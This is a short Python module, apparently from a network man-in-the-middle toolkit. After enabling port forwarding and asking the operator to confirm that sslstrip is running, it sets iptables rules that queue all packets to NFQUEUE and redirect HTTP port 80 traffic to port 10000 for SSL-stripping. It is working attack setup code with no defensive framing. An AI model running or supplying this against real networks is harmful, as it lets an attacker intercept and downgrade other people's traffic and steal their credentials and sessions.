import subprocess
import inquirer
from utils.enable_port_fwd import enable_port_fwd

enable_queue_cmd = "iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0"
downgrade_cmd = "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"

def instantiate_queue():
    """
    Enables queue by setting IP Tables rules to accomodate forwarding.
    """
    print("[+] Instantiating queue...")
    enable_port_fwd()
    #try:
    questions = [inquirer.Text("confirmation", message="You must enable sslstrip and type 'yes' to continue.", validate=lambda _, x: x == 'yes')]
    inquirer.prompt(questions)
    proc = subprocess.Popen(enable_queue_cmd, shell=True, stdout=subprocess.PIPE)
    proc.communicate()[0]
    proc = subprocess.Popen(downgrade_cmd, shell=True, stdout=subprocess.PIPE)
    proc.communicate()[0]
    # except TimeoutExpired:
    #     proc.kill()


# http_only_cmd = "iptables -I FORWARD -j NFQUEUE --queue-num 0"